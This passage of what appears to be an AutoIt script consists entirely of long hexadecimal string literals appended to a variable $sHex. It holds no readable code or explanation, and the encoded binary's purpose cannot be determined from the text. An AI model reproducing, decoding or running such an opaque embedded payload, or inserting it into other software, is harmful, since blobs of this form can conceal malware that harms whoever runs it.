8517800E313B8BF2C8631745EF3803640277D0848B0C18154B36D067987FCB9C2A13697AACE9C6031B0E2B0366CC610560A5A412C3A95AC00A4F9FC074D2C04856B1E86B37818E9D0B11294B6A69384114B0101E2704BC12191703E1809A4891004D4F918481E96D120C040094072F525155806D13815DBDF775040A6148FFA31B047E5844820499F34041C013E54FC84C9330EC9A6593620E5AAF1718778910DCA590624FC94A25AC331EEB565C231280A6E0EA6841D80A111CB4161CC39B588997D0751FEBC18B16368D240390D6D9583321F93C56BB209B97A4023795216F76A407E2055E303BC8F4E8666A1150C05C15766F6188612013132626D249FB4BE4C74C030FAB4CFF32085D041235CC0F852FE8BAE1F2547CDE0384ED187F0D1F6676AAC4D5A59958ECC4C44616C601A076E48E41DE6AC2B42F52C023299C91C0C0552774844CAA8F8F344255A7F4496DE3129E2835413930842B6B683C02A7702D19FC6800E1462320EB58D591D79A67E86CEC58500B001E0C1B925A6CA221A48E1966696001238D617F"
    $sHex &= "12123519E797DE39EC635B4493D9F84D2C8F640F480F0C0FF7215C3860DC142055CA3017601EF49F006BD4A501C250B3D44169226048A533A2278017B93B832991A66986AFBCB8BCB8C556050B9E0D1FAF29C019B6770CFD8C8782F1B692D4534C8C696209EBABDF300305A903F39515C09A26523307D2A52B9DCF6DD0E13CBC9AE92021AB06F43044C07C957D0347CCF619999A4F1414EB3699080CA5C603195CB304D83E47CDC5C631E8F1542E01FA1034250CE6F80274B155D1A71431CBC469B7C44C519E0E6232B77F0F6A07C083059223EE6ED59BE489807F18683750558103D60A8EB89611ABA0FB4FA1383F2EB1962D33D04CE9022B57CD6A41585BAD5D63098112215FC377C5056D32B52C532702D8225F0C0A275B5CB128370415652C7059C00543BA9F4142A8586B41EA071601730A45114B7ECF450850B85A3A41DF745D751A081C2106AC7F5EC30659D72F3125F70F098970215BCE6212E4A4C0456F27D092780BEB06F15E3F01A4C4042C9BEA0F64BB2BCD7372E952C63336E9454B560AF818507E1B60C3245149C07BD35F6DC46E420F087D13B10CA0FD019EC644110D4ADAA442D69A29201C78294CE11C7517F80823C0312BD3214D0748A1ECC931B14D88BBF0F72D82A949C4B5141A8CAF5193E8B27A81E474921E61521D0DA5CCA38C99445FDC3D8AB86AEBDC673AFE2305380BB5E43B027E2870C6158027F48E0D1B35E92B489D2B95CA29E8EB64977208EB87A4247D47499521239F94F8250E1335E01D75176595318CC41960318D54422F2DE7B071E611F7969C6E031834AFD4804F1AAC113155DC650A10AF9882815F77622609B8DC5508E6527009978DADA683404F1283D8DC001857EBDC29DCBA3284EF43E4E5DBFA3B9D86E49AC6400D010869ED36C59570EDB5214E405D1BB8F1C15A65E8117D361321164DD04664024C26E4A7A00BB154C3501AB5028C899F1AA02A1B04665490875CDB0D6A2E613FB0928B3685037F0322B9482E02022E928BE4010100D622B94800561B242F5F645C3FA74ED5A2DFEC56BBB0C0ED0CF07965D2A1702280E1790209D0BC9BD4A185ED68D223F136CE6D5B6A043D816892C02137F603084FB841896A4740DE5824BC9844512A58D84C072B5F38809011630B731B68A8A8D5B0F6D6400DFFA8F8DD610DE4B9ACCC1B780C2D3AD13180604E1E99A8ACE4A58C7BEBAA4D084CE25090FF55105A123EAA690F84E773CA58AD5DB8C70CA60133212004898EB82DA9113E2DDCADABBCD46F1B2EE9950B803E8127433317A4CD6AA4BAA6C3070B6E0307E13DE2E96A19AEC32C302737B014C181FC28666A5D2219E397A46B22F014BAFC521475672BAC9C092F6903BC2978200A2D90FA9416CC14C1F588967EF41BDE0355FA8C1345940C"
    $sHex &= "2018E41A04B2A5098C414A336D5BA52D1D79AD703B6E67246E0A0F8FC53D883B2C0F83B7041FB8A0F15884FBD2D44CC084A3D01EDF3DA4854DE03C88517B8988AB8AD4CF88B4965AC8C466B38830D204343D8CB08884408AAD80B783BC92B845C760E8888B4D8CBC81CFEC940E3E7734CE346E85150B84868423A81D6B0C0469EA06212B49502A75FD4BE98070B0F3D72D23BECEC0EBC6DF34612EFF69DADA4A8072F0D05B14DE0A6659852F24C26DCDC1F9A01078A27FAE32C0A3BB609B3485181271D218892C2CAD58DF0DFB383B157578590B0467BA5640789A6A56EF8693E154401F645AD72510BF22A4A3013C8967FC490C93945D7CBA586295CB1A20C0F0E0105FB378C06BC025020F9487804782EE530B884A2B210A61A236C311F98BA977C65AAB01E18542426E4C5F3680D5809B047CEAA245945F998D9BE641044D50080BC3CBC0B35F59B42038B8755023EA88E083E499B4338D436F53B8F4C30526031808C0511208EB894C0F3E38BEA349BC39B0B7F47F2D7C0B0B41F4A009488873208A2B191225330CFDA7DEA1487568EC8DEBBCEB1196D2C6642F0C4CE63D5A38D1FBB4AC43084D97ACE4BEFFAF2EA0A9BB26BDE0C4EEEF013DA63163D4F08800CC17E00D08CCF8B06DA6534E755D5F7CB07C4E40C3508B4954E4106120FA94606876969C04163BA219F8D6B40A1AA83B04348B6684282FDC2B3216E90BCA75E41B724C4D8C9814CED4718C0E42469AAFEE0E123E474619D4733E706C684622230448564DE4A5C986B71E425645E01A1E507535BC488D578A4CF1E2ABDE7A81C18938CD545B130C18198BA3115CCC6BCCD051D65862873556D81A2FAD5239B031C462C4C4E762F36998C43B731D8C00C41D150FC0C887C930E6D1208FD8840FA1E06AB5208548DB4CA93A0065D0FFA31ED44A909199747CBB501F2B6FCD81356293A336894B08786990891E29A30163A15686B9D29A4018431F4411B9F0D2DEA91C81C1419FE261213D691140100E626F197F70B5B90CEDB21923101802197340EE95942EB727233608D89F3259198DD8DB26A421BFF4F8FD5F8280EDE006E9DDC009D22849F604E186024BBB10DD98827A41E819D819695CB028FD81129978411A7265BDD2034123FCD9485A8D8B5434C0D82BF1561BCA6160F222C95156D3B107F823633D5D6D459A85D1354D4840C26E02D371084A206582CC07A73B279B1BD03B429B665C6CEB78CC713A7DCE794CD15726B0D686B9EEA8E9FA09026FC41848223E5DABBC98C48DC05431D43A40F0F70C5F1200F388C4F0D6DA3060E36C7376AFE4D63A801355AF15609329417B26749961A3361AA83C03E95784484C68D82E8A8016813E98BA4B2DB90BDF0EABC0F7A07A0A307EE4087DA8E795848E17F72EBF081C0170"
    $sHex &= "3CC93164120F2363047D0B250D08C237427D51B324033C831C1ACF4223CF02730D44AEBDB5B73C43237115498C2AE1F48181D60B89E34C01AD2302CB41BCD1C29A350ABF296E92F4D5EF81526A5DA399819304D7BD473A886089E4F58C21A28419A1E826F5BAAD2119022EE206201EF5C9144D4E5D512A37A126E509D9521ED0EC2B83745C5D5B9B1A0E51D9481B04E018A41FF84CBB5628B3638DF0A795762DC58B0D30760522336BF25CA1F007BF08F8B6220EE4CCCC822BA334407A036F8C5FDE3610DAAB1CC6CC5131ADC4DEF847A43187406D698ABFC880890EC082EC6D3A8046BA2E6BC8CEC8820629C9CCF3C80389DA7AD99D4B6B6B94BE81F4D12B1098AD0F6D18874CC93B86192C1C02AF3106F220536539D6617B18220CC003CCA449C0553A2BC2500A12043C45B731B6002582B5889B15FB4721048296F819530B2D61511810804DA580517A6A011899BA5C2829FC1C8DC0A8890F201B5C0606983F5C75021E0131028986FD9238D04DBBB813091B003C9FAFE193063261D2B8CB4A630EEDC06C0541418097A0C09D197904D28A85A401A4AB848477A4CB4985848012B46FB4F5172E075503030AC2F9A36BCA028B450C40436011876BD03896908809F9E43DB55A83BA2C2C00831C2CD402C6986203469C79B869E9B39E64E5F495A5CBD5B5F432FF83A37072F4B49A2DBDD51EB0CDEBBB9BED7301E96C7C86869118FF3223B7388D44113930168F05BCA808692ECD13A528AC040F838D064E46757E57970603D0B0C038034576A5CB8DECC01C884540205D104E7A476C10F0AD4D0884A537EC20EC4D5450744DE5A8A9E5870683C8041696A2D638782EE9A4EB00BC215B7DB0E0CA425A9847B93281BC985BD8550C14B3488815E363D6D1272A4DBC2ADC0711A4F99ED4B2745F5C10DA082D255B29675E8AC01388918DE00150E4412F3061C1B08B5167C005E0D3CC51A8BF6AE4B8CAA8A8A05B064557796A1802CE0218DBEC3F2A6DAD214504BC62840914379B06004417D8F2FD847A4C801BBFC0C1708512B285137321D4159A58DF281285816E9D850841381DA7314260E6F06136611E8C0C01E28485B420A5F40A196924A2F8F834D2CE5C734A997546D13E200E31256F7433970D8C92E31F16AE6C60A5290CE45A1E44B858875E95EB550D13841442985DA3004C769575090B283D652135080E2A13243D8F6A36E13A03CE1F14818D409F6C1F66A953CB28F088F62DA05B8A20247F2461B8F5413D386AFF6B871286D86D5D5B3356886363112C05734AC206833B973CD484300CA302751308D7063B246B52112448E096DC4D037CDC4A7149C08A115FC0D14170E4B30D7A14853C344B19038C14BB50088298E31D5B0279893040C94B073C80468622D97D68E11396C68BF6"
    $sHex &= "2D6843180F64138D3E62B4C7BF7B0C53432F0D080CE1B61FA2CD12B09FC3789B5A1A9396BE8BCD12B08559D180B8A80D89698FADA963833D8A1C56D2B4B08402FFE8EC84066A0064E8AE9BFA17401F68B49779FC04A39004A749530DBCE0742F933FECCD1822B08A0D618551DAC0D7AFEB19718091A88D735C43A838DDD5C50BEE1270250AACCF58D436603646D5F4D0290ED71CA38E893BD02B3914A60C1F40FC9643586D4876292AAE1BC5B4B092B959827CC25EEB104802D4B44818EA6882132C6261115389310AE77E6FE217A021D8205C350F55681707C76A09F5E48F2309F4D216BB18956FA68000E9E5BC06ECC0389D1A8B5987489BDE7321A8868554FFDD018713C2678D70A6C6CC6B091223262096CE77134F0485C202D65FB7E3812B18F2B140AE8D11D66DB15A207449853067191B79A8EB3DF84C7C5C755E91AF19AC27755CF810FEC4E30375116605B4DC2D2C99698D2D0F0CAF0DC036761FF913ED670C8274096B97EC0C56F2990405F8B81E031C9F8B744889A4700AF0743DBF7C183700667A571988782101CFAF53BC0EBB040E0B08148305AD351901265F8B58D2C9B8708710A1B51548AB7FD284991A1F95E182895179E31AC20643BB5A938851F5F712B1020E85F5C1D6C415F7103C6690A6E3746E1330F82CF5D464D1C2500C103A2CBCA08B1C2B00090B60F8E0BE2269C519BF8A48059842B8B6B1CD13A2878A5404260D7A3242940B6626349ED178E1E3F039868400D34802378F0533E730019133579CA88C96701C232481EC8D1416CB67C705082BE1197C482630811F6B94E4986CC45290251F3C592B25D59F426A8A7806B3A97434DCCB01A802856850E092441ADDA0DDB74E6F3F16AE7810C7F70336D58BEB12DB0C8B2D3CCC02D505A1438145A1FF2E3A2DE00E758DBFD93098B83CC7F00D0C7C9191D0CC6C909501870631A5BEC0951ACAA2548B18DA007283233A8884CF8BF0DB6C4A6B042A0E1E615E9C00394A7EA5A89420E935EA292563DC3B0528DC2861D88789B81C4D1098CD103486682E53BF9508071338CCABD1E17778EA3084650395DD18893A53726834B86E12730FB05B10A6A225C60B18C9EC090E1E586F4938115D024C6D7C5A378C673BF04F92A5D11E3F03ABB426FC087E10680996B3FB07B60A4A572823902A81582CF725C35A484CEF03AA8C08B494207E29D87261020B340D08EE3398E4D3380EC22C1659B17A012908D96DD418CE10303D9546165C2367D42949024EB363F1032E35423C699AB653F934E25555D618209E895DE0221187E492D8408890B092303681E930AEBD86C301F994C0BB870417C36C671988558B45775240D8A6D4FB339A847B5B03B70065317F286D70118E8231750E68AC857B1F49A34F9756F6FB45F5093A"
    $sHex &= "898AB01F8E6590A687D40FD9046C12EE550C733150B78A41518D40899A872BCB221C784D92B5BE8D8F5D39B27AE8D8AB8F7B6BE021A409FCA1214630C4D4187B8F9D7A5C625DD21CE23AEBC7599AC73B81350FF456EB68A3FD8C7C73F7CAC2BF1E2C81787C002095F8103A90DD4A2A3E38F41E012195B18AFDB0A4DD9E110C410F04C01CE031940064B9D43051BA00F977232ED80C684647EF5117213C8A955514272FA15D7714CCE981CC9B6118008D2E038C2C9CDFD0305074CC0088D34EB35DDB1CAC188916C00545FD0F6AA36E3641C4D35A78DF3297484DC4884807B4C7BE83481879AA2BD066689A690B10454239D49AB7C304E5B0CC0D0270A7F94DE80C1701CEB2EECA0816A47F44C1C36E5662493964E00A6402460D62D246BE74DD88FF128C872301811F71B9F89946D00509CC930504711545FC45205F0C828032A6DF5FBE300546FDFCB78AA40586F3910CC82764F8F88B4DFCF809649296B5626C928CBFAF87896D0625A30E2D5C72DCF8E7300B19503E70B46A816D997408C221F5C79CB623635D1DEC50638705E1BD30E4786F23B1B53FC8341348DFFC257D1630D8E9E6936AC0DC0FD82ED6886B08701F7B5F84B90A75F8CC642789DB08BD9774347B04BC43587B7442065A12687D15D1029422497FCD038E2C83EC1B70B6B76B355D10201850DD826948E2EB88A5D85072538A718A176CB82FD2E3D8CB1EFDB3DB559EC8D0E04992D41791E439A2B681BFB08E438509F46F984D6F6880CEC63521C73C04242690E30FD964155250FF17C7351321B88D13DD020B06FE101B6A2C2AC2F8822B039EC87F853B93B13E1C146618B8304320E3278B70BD1104022324851751FA0193D7FEB0601A9D18250A02366A71649DDE8F200DE2C87A889B076B152EE5E1B7A413DCBFF1090183BD1939FCEAC11A843CE793365A240DB29874765AD80AD16A0417D84CA4848F2528DD0E5905DF68A96CA10D8D3D8EC0C087C8CC3D4482F29D34B384FD00694E3349EF0C87746C6C1A6C6081D24B573B780ECFFC3B2F32B86FA23E6C62136E08018EA7120F4AC15B0A4611E864E968C3D97C75B211B70C36B0F23D95604360744E4380111F89F43774AEE08A40892C13016351DB170F05191846DB9D1346B804E3089A2BC2DD14DEEC1BF4B44F3A5840BA99B8C7C405E222037BA4E389C23E5458AD8A13884B837E7392B0881870DA3C90DDB7AD9DCFA3CCD0180B4513386D21CC28981CC1E867DC19C36A6448BB403C4DC19B0E9305A772F40C53D1852352686C9053FC5A6CE2102BD741E1569245529D011A5BD355E5884241B83E49EA8880FC5E64279A4D897A2052817820C0AFA3052F1D9281792028E23A5A17113A38AAEFDFFBF4234120742AB92051146D608C563D0E42D50FD2B99848"
    $sHex &= "D4C645EF423C0F89783D8A558C0D3211ED808A0404AC4F443CC824E31B14124C5BDB9B2F8688C3CFC482761720503DC1685861EE3D9A68E8C9C0EFD9A4A0A2E4C7A4A9CA300D478B05A8404C9C81493B5C7C03889B3735C92C6A00A9D87D982938FF7838C8138A8636308D1ED775084853B65CD30DAF6B633CBF187815178BCF10A720455D332B010BBC44017317E40294B37B11D0BE11490BBCD33BFE2FF10C1818EEE985546B0B9AEF0D730E1519C9C16F49A5F5AC8878493BB7293CA79D11EBE32B27B030F6B5E173242178AB04B507FC73878C043AD9491804BDAD21F079052533599C1C7B6DAB73CB14CFED4B04927DC789E7BE3318910C298B8CAFA60DB8DD143F9D49B75E6C32AFF13DCDBE7028A9166126F4752B7C10CF95F82A482588D51F4D11181B9671849C8FB526D3672A610243072CFF21ACD4C5208B4C356A123B41071F1560008D8FA7F612C2A4C867022DAD8EC219022F173E805A4E2998DC9BFF0FC69020C8D3D2C848188365BCDF7836871235D495A8B7463B2D7D10449C8BF8F184B142E704A82C1B6BD500FDDA4062B9A3856101DE5C82704B01BD2B9B4585A5D51BFFD790AE889B460FCC1052C48592C5E8B08679004C805FE99DBED84E4B8C5168D07AFB8BE8C067B59FC41885144BBACF21CAD783100C81B729E4B695C73F02F1DE37898AFF1F976A0397ABB43B07EBDBC20008AD04224149C3D25A69DC5F0FE379D5D29667473FC6BC40BE40848676126837B40F6A6A70EB44882B3CDC8055C22425C9630CC0B7A759410DE24AB1A01B3BD6052BFF2197A4B985C79B6A470504566A0B017211285C7C67BC093C5AC41153DA13684705CBEC03093C60C313DEC4496F25751EEC021B6E7103BB9037D8053C0965B67C0B40E20A88710520551BDA6637B131F49424867F18DF03A3292918694FBF68FDB05D409086671F3985D30C041E851DD5E02D5D130D0E188182051E8BC599B068083731FC20B5ED7735320C24608C1F0FF64800D6C875A43F88C022486D8AAD339E2F14743F944D49E24558F9D1220BE8D96A73F4E411BEC376D66287907D91468803C2DFB634026505C76982D9725139A5D782506E5D712D51C0E33880CD1D75C461B50FCD71584E5077D25F0F8B0276914021F109BA21D7FB48EF1069930C0343FC4988F83CA05E300F0BCAE3141B9F89147F8F187A43986AAD4BB30CB74D22AE5D81F7F001C25600B14D6F18802B28E5C3889766E11C4B4D61FD5A91D389758E9D302ED149719E5E22862D5BF41D81080B91835B864E6F2651DDB00C952B2086469A97ECC804ECECD635364567ECF5C5C3AB8A16DF48101ECB403804050E384D926CE2F2352206D14210C3C33612A74774152D464A40698B0D96A7E31031C6D15310093C012BF5451AA78D68"
    $sHex &= "680D295C52CB26CC10B31AD786CB988360DF33FA41296881078B320B24684023B94E85F0E0720652C5C396C02A2C2713104515309028DF7FBA0EB656AB5C4B7528602CA023E62DE0E08003A7590B29A2F097B310DE0DE2A682297C726634B08297FB0C822FA37BF029881023C04642A5D9754F621A820B9E431023D77A8117CE5FC203A348F4832E1289D804E2416FAFAD4E0B58EB75F59F1A7AC292EC7F1E9C047E95FB9FA14CA161BC49340A0771EB2600B30A0CD9F8C6934E502E84C5B8A4D081EB3A9B4DC200CD0CFBAFB10D1C19FCD1929C819E452BF126FB1B4001E88E419581A490A0DB46B1812075AF4AE34325A7E046028386484F0317683CEA840BAF7EDCCC8ABBAE0F00135F719A6D81540860F08545AD21EC2DAA8B6D408824B651D425F8A937F5FC5AB47F0D125D55B8558D871FD5E8030781A45D18F4EC763CEED3861B5A6BD4F0742920ADCF14239A1B1692695EC71E6B0BE1A22491EC0B2605A618099AC22083D56A9252E8C7F451720D2B48470DF49389BBE404E45CA120C4B7B6028304391C761568ABC1036EDA1359759E4AEAEA0839C5B32A32D8833D9F2E821227806D6E58CB7072B3DDB3100D5A80DA2BFF91D07E033DB533A11A4712720FAD680FE792B78DC25492B53C6F4283E4C57E3B21525B503424573F323D5893811CDD97996315AC4B6D4D20A475610D4D98FC867B46026720A0AC5C11588DEF5F43E44661AB0DDFEC6EF189146B112AA0FFB6308A63E9E47212E9C065E06865C029B26F1D1F887B61865D0576E300AA4565AC299C185C4A0297588E773C9EDB6F8D466995FC5FC7C2CA84880E44042DA43175862CC4D60C6025567996AE85D1692FAC100D7574CB24193868030493CCA499C40104ED308A8C4CF18B5220BA26AF06C29257E2C958A01953DC1B265814CB1D0CABB0E4730625F3B30415E8E101215C32E30454F05669745BC37F06C78269F5DC68F06F420818045521C4749ADD8444EDB05A91112C9281A468AC89638A782FB9559B294E2588E00148C5E64C0C0C1C17AD89B00A1E9EF7F1453A187C7A9B5DDB1D4CE11F04243944EC9335E75A0A698AFC73FCE2E27D636D38AE9BFFA208F0753AAE6DD4A2D446CC2C4F8F55B5CDD0D4201F2F5445E59CD0F086340D1168D05117A855D7F9D03F41B162736A362BC7D62FC2C8DFEE85FCB56343B03C750C4D087FD11518D5D0537DD47D49C7411E2050EB3046FC8E255F03D472FC1797F9540D1EE8A9016F17156223809F142A5B4CE000767B1F58F01B89C4900875BC7943524F10DA58BDA9A9A5BC95EBBBC093F8322EC04E3995CAC5DE57C48D4C9079B8B8B86BA23540583B987D8A85FD7D534FA0EBB6EB07F59A9A019C0CFA700877D9C28EC65068EB09C145AA442997028EC895AFD734"
    $sHex &= "14B48D78C8E8DC46030969CC7C354576008EB766CD12038E8AAFC4F3098F4802DF380CD49056245F855A5DC7D60C912B6030265CFE1FEB3D85E31B0E335211DF550ABC47BD1F394D2E12C2788531EC7B08C4801C163D1F61242A68A920F31221E73C39CB84900E07DD085650A61A7A1423302F50E9882D243B39097C02FD6313487A52C6832C21450704FF1E84B041B0A468FCB071205865BC8F1D7186E160ACFA314080DF402A781C3D890A10436D221B260B2335AC3F7D3225875A4DEDA00CAC624CA840177306084B5EEF3DF75774A2381DE7685699EB0A4E3F521DC601AD48DD0636CB7F8C0D224999EB89211F61F35CBD80E1A650A53E8341EC207142001FB0C8C25B85C3C2BFDDB747247C83FA137C1268D5BD2A2175A0B7B38AEFC213BA4B9BE0D6B771519BF9F48B3F63AB29A264DDF9844A0C182B49A05D020E79A55C5C69031C49C23E3D450ABFA0043F017C194CC1CB0D8385C64C03A54F94E63BC236621A2B64E0BD5F8D668BB8F81B5397C015BF8E752252B42613CB11A1E3DB3E15F55420706D220B77243E9875CB67E8773F6837F51341F31BDA866911C10E205890D875FA04BD840148BC8E3AE180321F656531A012D21C7AF40CE22084AD8F3885F83A001B41FFF30AF4A5CD84EBECF42450804035AA650D0A477A8F23080C2355BFCB58E6100E5F5374A68103C38803805B12AEB5506FBB1D4A425A39307F238B1DDFE916D16325C76FC8621488C2EB92ADE0D41A21DFFC758C45B46F65D1011A5713085591E418AC3F2438746A071F5BB8E655432875FBEC30850857626C490F1CE0B304A4398FF427A4F00161D9D08C6C8896324B22C4698A8961C45C3F187903E190C0712DE9C81EC08E9A4B3AE4D40E02E71A3BAC06D38EE26D0521CD39696383C50CDC94D9420B25134755037D52F842131454BFDB0501CD1F496B0C31F18808D5E15CDDD180FA4D077BEB198B138207D3BAC1F61B3F58004E1A03C0030B48C182B215FD10A0883303FE42BE2040A93C114F40D41A0207E0B633BB0B4C2109110100756BEABD6F6114502B60E8716004824DE074511B2EADA90BBF249BE0522AB71A0293792B135831462E438A5AB1028DB3E80EC37890066822B73F816071F70E2AD6B9DB73AD053104A1083920F135D0016A3234A93727024308FF34C2405218AE7125155D049B02AA686A06C62BE9A534FFE8175716654A664E833D05184D24BF4D48E9235D4A1A1C02185860D3B174270B182CA2243838ADD58D3F24994266412544C09092B6F287E1DA2061AD12AD82161AFA330BBA43C2069751486DB4CC65AE521E51079CC42EB7DF207C41200A4303BC45290943498503796400F74124A30D2E7149C2373D4298188D259776A3611C31253E1D03B4D1085DE48B4A21201B21"
    $sHex &= "B0D992583B332EB00663814907A35112E90B84C6301ABFA547574A3A5843E31C99B84DE00F83CD53BD9E1A859689DC3C42F000E7B10163856073064E6AB87FF47F081814C067B8776BFB0303574319527B755A58EA744A829FB7082E804F5B42004BA5508FDCD183D716E54BEB81ABF04E0A4E05A8057D6CF9D10E853111B4DC3722C50A881955A23D8C03CD7A59BADAD243F11B18F82035F46143872833C9395206112140F297D30DE38846E46B425010476BCBFA2BDF44FC26A0F775258114812DA3205189C2471A930960EB059C5A44043FBD4F018C31A6B69B10D3E2BC0BE07E9E0B90501C7291110BA01349DB589F0946B84D0C8881175F1F42B1A928E3A5BFB64B54A231656F292CE000C01D3193C20AF1EF5CC3FA70293917CA0CAE6E29F9D630C1F474190CA43A7B185A5348DF9B502B1B45EAE91034112BF0440AA1C3C452F49DAB4C978DEC09F0DCBC1D64BCD59498116A457C9A58B643A70E133DAF0975BF31075930270D15214B53CA0CB1B435CAEA2DF4D57DAA54612355A08CC03581ED3F1923700470BC9413DF798E605FD8B811CC44F02A0B9FD852D558B2838D3DD6DCD2C314CC7EA9FC4AD48A2E41FC4FE4D4169C7574277197D70C36B14BBA106FADAB28AD0103422D7C80588FE323014B2E64F4FA0026460BE9FCC50984DBCF7FD845A4C638518DABD8C442F20950BC6A0B49C47C3589EF01ACB51C32017E86B7E4A574CEC855B7D487A5C58B14E8BFC97DB232752C1FC688EC481D013BE390F0B52B4B94A8C1ABEB89D2C44E8FD999D851C0C46C317401C8A5C8794FDD22E8F86C5E5C32E414C3C8CEF4920389A710CF77CA56C71FBF6A1299C2615C472B27214F14A8B4E505970610081F9C41AE6D2F4104020E11AD08C32307525B08E0F499DD89B80F16551466A35B5DE60E9F1D4DE8D82D60F2DBF8A1265212E1D95379B538C7B820B6D0CF1861B5640B90E51A0BEFEBF39FC62B730B1E7045EABC2BE4F491AC29F98130489181BB8B5ABF25A2E603C437B5E207006C5449E976674D00CFEFBB4A17C178138C75F850A0D732344408C84023CC4C10CBECA11464056391AC828463C9215ACF548EB8D6840CB9FFEE61B58D442BAA1B75FAAE4610AD02A7E8B4D8B58A474776750B3A16427C75245201890DB74AD40FB38A98B911AA2D1C256E311F5036377752819CEE9C1314242AD455DC25012B110961A904B0E4235BB1884B101BC252835BC41AD7704A5227949B10001D207DA663FDE7D8042456502507240D6D5CDC87E81E5A1F2E5BDB9A4249C40032C06F05D0104E8113FB9AC069BAC3D7161AD4E05283907F1CD4612CF945176214F1E10A258CFFCCEE3A416411D1DC9F62723BB10A6FCC502F378A245F284D45FC50B702BB24BCEB10CFA8305020DF207F"
    $sHex &= "D2040B0FC6CD0F142A0119F27FC5826CCB3F531A475BB202D01694CAD04352CF8908A13D14384AECD6513DC1CD88585D854DE42472A901C61C59A1A63014797CE825E8E748EA5DE899C116854C38640A46624416F04F07038D14C508C104792C2B79FC278C1B6011EC2597AE5BF2CB14D90142832B81568054A430EE8243582387E8EC80C343CCA9ECB9E8715621A81D3FB787B09E124A6850AA743275263FE8E028605C4095F51861A03BE0FFE00575CB1664E01241043B08C32AB8F0C79CA6350D0E5EA3F554020640E1362CE22C60003CD134D7E27A68CFE457AD858D201239C2B51252A0E4AB1AA153AB373F1372C52CE939040756080A495C294180E5C47C6E44B946CF1F03B4CCB7B3D5C22FE95DDF14A7351436117782BF14AA8EF3AE8DDDA27D8EE60EE8D716CD017D291FB4120638144EC1DCE8B5848428C965857ADB485F31644C33D45B0DB839A33D73EF4047DDE5421E2DAE96DB0AEAB8185BAF10521A881190BF75B385DF95EA8B04243454AA4B6B11CFBC90CFCD188B4D18A72C4916CA844B1A378593A606857EF88F61211F00B8304DEB740253AB59F79C23F069EAE87D518B9B4D0B5F13E461053A3848ADBD23F119D2DC82232F2773107446DDEB9EEA9AEB3CAFA170BF302FDA7E29D6BF882340071873C4355CEC10B9EC451047EA611D6DBCC72DA28550AD7F132F2824A1532020E0B638128FCBB6B2C9F871AA060121025488406AF18C79A1175E476D232C2BBD10DE90F145C3040A2B8D340DBCE293E8811017109995C3AA29D151D84C7A83C6E0C50185212C4924FDD302C63A54C14012B883B70D1C18295E22AE4CAC4D6921DE15B09F60DC89024919953030D083620DDAE26063746D144107E296835317E488819A421935FC838770DAF0B145206925D617DA601C8A66334B0EE8DBD51E1B196D7440C2E1CEC490422F37F8A80F431A3CE8311304C606AEF52E74486A05D7D99F20A02167FCE3EA102EBB940250E802E0EC9B29AD5A7E1965FE880A15A631FA30FF88EBCD5075378DE32F102DF8FAB2B012FE73748F5A88121DFAEE4AD52048030B1B90D1C616234010FCC2D3A204A317962024E0709519B84BD158F2A91F60C745ECA984D6261B3961E0FCD8FBA703410399F951042701AA12CC9320625A52B1092236A7DB47DA8F0095EB0D8A242489C0565916DFA13E7A06063BD8578342F6AC05D5A7BBD245EB48EB4A021E402BEA1C2B2031A2B0D1AB20E13EBB7F1101431AC756142F7CA43194B65669C29DD0E280CEBFFA7D6ED53ADF108D1464CE1E28891048A044B586CAC03F50235BF6E61EC6313A4B7AE6DB8EEE2213018FC9B3BA61F10938A472E133488855D1CD5F24ACBE1199D874E2F68E08BD88B774CD1B075C47B40F663304EE2334AAD1F484C8"
    $sHex &= "B8A0BE577444C96FE1976BFAA4038855A3CF8A74C3ECA4514816E2D8083801DFA9EB8ED00BD204EC2306F060E30063802BB515FD145BA8A347C321AE880AD4B110483770A03EA8B18003EB4A5BC74FC1F09085264C1D40AFDC103F45CB4B0B3A7E06CBA8B32D60F78E2645E42D3D2321AD64AC5877DAF4A5CF7E2A25012F0687E02BC5EA97DD63033A1DAC388547D7BDEFE435E4CA2B35DCD17577A08A32968DC4AC901AD2F0C8CCEE14D406C67435FF400300E3041E98FD0970B856BDECFC0A9C8F139DD03832E479607117C1FFEC3CDE49506FA21EC8311193162E5AFBECA326740D8D5F06ED931492F475C0BD19C8F1E4721111B1F0762F0E96149207039B2987443C1D72C0C4B91BC94B6062B39C5D15B14A9BBC7519AB5D68DD0069E326DA355BE849444374E61B1CB3564B9B17CBC4CFD0EDB035A759850F524DF426B7443732142E323F0DC581C8F01A1ACF35F170A14F5C7FF21F1D846DB70E477DB1354230A6A19FA1B7322A4DB567CFBA0844A7F4976F0B878B03544BD8F50A5658C8F4271A1A5820ADDD52AC840506B294419813595304A5B257EB011AE1BE93D92C522490B229CF237A516C8451D900B808353EB94200C4AAA0345F4A1198D7A1A57DFB2CE259232512F176A079300C675275229456667B8AEAEB8DB668524069BE03A0047A515275CD2F9FE6767DB47714728B7576BF4DA43E54166223C8B40348408285180C2539F3504B7A9166D13BE571113A84BF1180CA02A72D8F213684E70643238D309B29A903D950D3A3163CA4418397E47C3E741BDD041F3939128587D08C7F6426E154230B8FEBD68520CC88FA5CEB6763365D366E5D634CC3831402710F39F6197709070D375C640246641B094E09DA24DA500206FADC924DF04CBE69BF60255C5C31A0E590FD84B1E3C0CB41000BA4E8C0FA29B45C30F0256C44E2519B480140CC26599461BE50450531C490715176598610125CE87566E412BE2849F4EB146FB6B14A1020AC9FC2C28A097509439152C7925E1F34F5B81685353E071EB16E43B949161230B614FF392A51B8F0FCC1CCC407002C39C84008DE47F1437C434353303BC2771A873CE504E83A0307021B02DA0C44422459CDBC56DD1E0CBDD70E5739FA736407A8AD27AC4ED540936D02133A9C760D2E0B5F07A3E4A3440C6857929618C1D40C1B585E00044FAC1A021A4E1D14891428E99384D91D84C176CA0FAF6AB6D4D22945370F02B505AE05E1860587B305805270E09577166A3E622354524BC06374524449813ACA7AE24BD9CA94091E38441336B159DA90CBE102693D653C0689585B10CA007652C9EF81D6B665A33C0C7D2048DB7C588B4A3C8126251A78DD20ED588287F4584F03DC33550CA9C4202748BF2F012590365B2EA584D50F97DD"
